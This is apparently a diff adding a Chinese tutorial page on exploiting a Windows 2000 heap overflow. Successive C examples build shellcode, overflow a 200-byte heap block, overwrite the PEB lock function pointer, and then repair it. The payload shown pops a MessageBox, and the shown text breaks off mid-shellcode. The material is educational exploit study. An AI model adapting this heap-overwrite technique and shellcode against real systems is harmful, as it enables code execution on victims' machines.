+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">//used to break process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//overflow,0x200=512
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="心得">心得&lt;/h4>
+&lt;ul>
+&lt;li>就差ShellCode内容了&lt;/li>
+&lt;/ul>
+&lt;h4 id="代码示例2不完整">代码示例2(不完整)&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 200 字节堆区结束，以下是溢出数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x16\x01\x1A\x00\x00\x10\x00\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// 下一个堆块的块首，保留
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x88\x06\x36\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// ShellCode起始地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\xF0\xFD\x7F&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// PEB同步函数指针位置
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">//used to break process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//overflow,0x200=512
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="总结">总结&lt;/h4>
+&lt;ul>
+&lt;li>此次写入了shellcode的部分重要参数，但是主体内容还未写入&lt;/li>
+&lt;/ul>
+&lt;h4 id="代码示例3有问题">代码示例3(有问题)&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Do Something...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 200 字节堆区结束，以下是溢出数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x16\x01\x1A\x00\x00\x10\x00\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// 下一个堆块的块首，保留
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x88\x06\x36\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// ShellCode起始地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\xF0\xFD\x7F&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// PEB同步函数指针位置
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// __asm int 3 //used to break process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//overflow,0x200=512
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="总结-1">总结&lt;/h4>
+&lt;ul>
+&lt;li>这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出&lt;/li>
+&lt;li>但是问题在于无法成功弹出MessageBox&lt;/li>
+&lt;li>原因是PEB指针连着ShellCode一起欺骗了，需要修复PEB指针&lt;/li>
+&lt;/ul>
+&lt;h4 id="代码示例4完整">代码示例4(完整)&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//repaire the pointer which shooted by heap over run
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xB8\x20\xF0\xFD\x7F&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">//MOV EAX,7FFDF020
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xBB\x4C\xAA\xF8\x77&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">//MOV EBX,77F8AA4C the address may releated to
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//your OS
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x89\x18&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="c1">//MOV DWORD PTR DS:[EAX],EBX
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
